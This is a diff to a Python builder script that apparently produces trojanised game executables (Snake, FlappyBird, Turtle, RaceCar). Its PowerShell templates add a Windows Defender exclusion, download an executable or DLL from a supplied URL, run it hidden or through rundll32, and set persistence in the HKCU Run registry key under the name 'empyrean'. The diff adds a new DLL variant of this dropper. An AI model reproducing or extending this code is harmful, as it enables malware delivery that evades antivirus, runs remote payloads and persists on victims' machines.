@@ -68,36 +68,74 @@ def main():
         "Author: ELMERIKH\n" + Style.RESET_ALL
     )
     print(introduction)
-   
-    powershell_template = [
-    "$directoryPath = Join-Path $HOME '{directory_path}'",
-    "Add-MpPreference -ExclusionPath $directoryPath",
-    "$url = '{url}'",
-    "$targetDirectory = Join-Path $HOME '{target_directory}'",
-    "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
-    "$outputFile = Join-Path $targetDirectory '{output_name}.exe'",
-    "$programName = '{output_name}'",
-    "$programPath = $outputFile  ",
-    "$registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'",
-    "Set-ItemProperty -Path $registryPath -Name $programName -Value $programPath ",
-    "Invoke-WebRequest -Uri $url -OutFile $outputFile",
-    "$installerPath = $outputFile",
-    "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
-]
-
-
-# Combine the PowerShell lines into a single string
-    powershell_script = '\n'.join(powershell_template)
-
-# Argument parsing
     game_types = ['Snake', 'FlapyBird', 'Turtle','RaceCar']
 
     parser = argparse.ArgumentParser(description="Generate PowerShell script with inputs")
     parser.add_argument("-d", "--directory_path", required=True, help="Directory path")
     parser.add_argument("-url", "--url", required=True, help="URL")
     parser.add_argument("-n", "--output_name", required=True, help="Name of output executable")
-    parser.add_argument("-g", "--game_type", choices=game_types, required=False, help="Name of game to embed executable into. If not specified, no GUI executable will be generated")
+    parser.add_argument("-g", "--game_type", choices=game_types, required=False, help="Name of game to embed into. If not specified, no GUI executable will be generated")
+    parser.add_argument("-dll", "--dll",  required=False, help="name of function to run with dll file")
+
     args = parser.parse_args()
+    
+    if args.dll:
+        global pow
+        home = os.path.expanduser("~")
+        path=os.path.join(home,args.directory_path,args.output_name)
+        #subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          #             "/v", "empyrean", "/t", "REG_SZ", "/d", f"C:\\Windows\\System32\\rundll32.exe '{path}.dll', DllRegisterServer ", "/f"], shell=True)
+        path = path.replace("\\", "\\\\")
+
+        powershell_template = [
+        "$directoryPath = Join-Path $HOME '{directory_path}'",
+        "Add-MpPreference -ExclusionPath $directoryPath",
+        "$url = '{url}'",
+        "$targetDirectory = Join-Path $HOME '{target_directory}'",
+        "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
+        "$outputFile = Join-Path $targetDirectory '{output_name}.dll'",
+        "Invoke-WebRequest -Uri $url -OutFile $outputFile",
+        "$installerPath = $outputFile",
+        "start C:\\\\Windows\\\\System32\\\\rundll32.exe $outputFile, {dll}",
+        f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v empyrean /t REG_SZ /d \\"C:\\\\Windows\\\\System32\\\\rundll32.exe {path}.dll, DllRegisterServer\\" /f',
+        
+        
+        
+    ]
+        
+        pow=powershell_template
+      
+    else:
+        home = os.path.expanduser("~")
+        path=os.path.join(home,args.directory_path,args.output_name)
+        path = path.replace("\\", "\\\\")
+
+        powershell_template = [
+        "$directoryPath = Join-Path $HOME '{directory_path}'",
+        "Add-MpPreference -ExclusionPath $directoryPath",
+        "$url = '{url}'",
+        "$targetDirectory = Join-Path $HOME '{target_directory}'",
+        "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
+        "$outputFile = Join-Path $targetDirectory '{output_name}.exe'",
+        "$programName = '{output_name}'",
+        "$programPath = $outputFile  ",
+        "$registryPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
+        f'Set-ItemProperty -Path $registryPath -Name $programName -Value \\"{path}.exe \\" ',
+        "Invoke-WebRequest -Uri $url -OutFile $outputFile",
+        "$installerPath = $outputFile",
+        "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
+    ]   
+        pow=powershell_template
+
+#subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+ #                      "/v", "empyrean", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
+# Combine the PowerShell lines into a single string
+
+    powershell_script = '\n'.join(pow)
+
+# Argument parsing
+
+   
 
 # Display the available game types
     print("Available game types:")
@@ -109,7 +147,8 @@ def main():
     directory_path=args.directory_path,
     url=args.url,
     target_directory=args.directory_path,
-    output_name=args.output_name
+    output_name=args.output_name,
+    dll=args.dll
 )
         # Get the path to the directory containing the bundled files
     powershell_script_list = powershell_script.split('\n')
@@ -149,7 +188,7 @@ def main():
     end_index = paw_contents.find(end_marker)
 
     if start_index != -1 and end_index != -1:
-    # Extract the desired section from 'paw.py'
+    
         desired_section = paw_contents[start_index:end_index]
     if args.game_type:
         game_directory = f"games\{args.game_type.lower()}"
@@ -178,7 +217,7 @@ def main():
                 pew_file.write(combined_contents)
             print("Creating the executable...")
             create_exe('pew.py', args.game_type.lower())
-            print("Finished creating the executable.")    
+            print("Finished creating the executable  in Output folder.")    
     else:
         print('\n')
         print(f"no game file specified, generating no GUI exe")
@@ -193,7 +232,7 @@ def main():
         print("Creating the executable...")
         print('\n')
         create_exe('pew.py',"no gui")
-        print("Finished creating the executable.")
+        print("Finished creating the executable in Output folder.")
 
 if __name__ == "__main__":
     main()
